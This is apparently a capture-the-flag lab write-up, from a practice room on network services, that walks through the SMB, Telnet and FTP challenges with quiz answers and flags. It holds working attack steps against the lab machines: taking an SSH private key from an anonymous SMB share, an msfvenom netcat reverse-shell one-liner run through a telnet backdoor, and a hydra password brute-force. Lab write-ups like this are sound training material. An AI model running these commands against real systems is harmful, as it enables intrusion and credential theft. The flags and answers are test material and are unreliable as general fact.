# WriteUp de Network Service
## SMB

### What does SMB stand for?
Server Message Block
### What type of protocol is SMB? 
response-request
### What protocol suite do clients use to connect to the server?
TCP/IP
### What systems does Samba run on?
Unix

#### Now we turn on our firt machine and get the IP: 10.64.152.144. 
#### Then we proceed doing port scanning:

	nmap -T4 -p- 10.64.152.144
			PORT      STATE    SERVICE
			22/tcp    open     ssh
			139/tcp   open     netbios-ssn
			445/tcp   open     microsoft-ds
			
### Conduct an nmap scan of your choosing, How many ports are open?
3
### What ports is SMB running on? Provide the ports in ascending order.
139/445
#### Now we continue with Enum4Linux scanning
`enum4linux  10.64.152.144 -a`
### Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name?
WORKGROUP
### What comes up as the name of the machine?    
POLOSMB
### What operating system version is running?    
6.1
### What share sticks out as something we might want to investigate?    
profiles 
### What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port? 
`smbclient //10.10.10.2/secret -U suit -p 445`
### We have to try with the share "profiles" and the  user "Anonymous" without password.

	smbclient //10.64.152.144/profiles -U Anonymous -p 445
	ls
	get "Working From Home Information.txt"
With that we have just downloaded the .txt file to our own machine. Then, we give it permissions to read and get the information
	
	sudo chmod 700 "Working From Home Information.txt"
	cat "Working From Home Information.txt"
There we can read that the file belonged to John Cactus
### Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to?
John Cactus
### What service has been configured to allow him to work from home?
ssh
### Okay! Now we know this, what directory on the share should we look in?
.ssh
#### Then we do
	cd .ssh
	ls
### This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us?
#### The default name of an SSH identity file is id_algorythm
id_rsa
#### With that on mind we repeat the same process on the smb interface
	get id_rsa
	get id_rsa.pu
#### Then in our machine:
	sudo chmod 700  id_rsa.pu
	sudo chmod 600 id_rsa
	cat id_rsa.pu
#### There we find a user: cactus@polosmb
So we do:

	ssh -i id_rsa cactus@10.64.152.144
	ls
	cat smb.txt
### We get the flag: 
`THM{smb_is_fun_eh?}`

## Telnet
### How would you connect to a Telnet server with the IP 10.10.10.3 on port 23?
telnet 10.10.10.3 23
### The lack of what, means that all Telnet communication is in plaintext?
encryption

### Now we start with the enumeration. Firt a port scan.
	nmap -T5 -p- 10.66.153.107
		PORT     STATE SERVICE
		8012/tcp open  unknown
### Then we stablish Telnet connection 
	telnet 10.66.153.107 8012
		Trying 10.66.153.107...
		Connected to 10.66.153.107.
		Escape character is '^]'.
		SKIDY'S BACKDOOR. Type .HELP to view commands
### Based on the title returned to us, what do we think this port could be used for?
a backdoor
### Who could it belong to? Gathering possible usernames is an important step in enumeration.
Skidy
### Great! It's an open telnet connection! What welcome message do we receive?
SKIDY'S BACKDOOR.

### Now so we can listen to our ICMP traffic
`sudo tcpdump ip proto \\icmp -i tun0`
### Then we return to our Telnet connection and run the command:
`.RUN ping 192.168.198.16 -c 1`
### And we effectivly listen to this packets in our machine
### After that, we generate our paiload for the reverse shell
`msfvenom -p cmd/unix/reverse_netcat lhost=192.168.198.16 lport=4444 R`
### With that we get a command and run it in to our telnet connection:
`.RUN mkfifo /tmp/otdpf; nc 192.168.198.16 4444 0</tmp/otdpf I /bin/sh >/tmp/otdpf` 
### Eureka!! Now we have completed the reverse shell and have access to the machine from our own.
	ls 
	cat flag.txt
### We get the flag: THM{y0u_g0t_th3_t3ln3t_fl4g}
----------
## FTP
### As always, we began with port scanning:
`nmap -T5 -p- 10.67.156.191`
#### we find the port 21 with the protocol ftp.
#### In order to get the version we run the command below:
`nmap -sV -p 21 10.67.156.191`
#### We get the version: vsftpd
### We start the FTP connection:
	ftp 10.67.156.191
	ls
	get PUBLIC_NOTICE.txt
	exit
	sudo chmod 700 PUBLIC_NOTICE.txt
	cat PUBLIC_NOTICE.txt
### What do we think a possible username could be?
mike
### Then, we try brute force witn the user we found:
`hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV 10.67.156.191 ftp`
### Eureka!! the password is: password
### Finally we log in again with the credentials "mike" and "password"
	ftp 10.67.156.191
	ls
	get ftp.txt
	exit
	sudo chmod 700 ftp.txt
	cat ftp.txt
### And that is how we get the flag: THM{y0u_g0t_th3_ftp_fl4g}


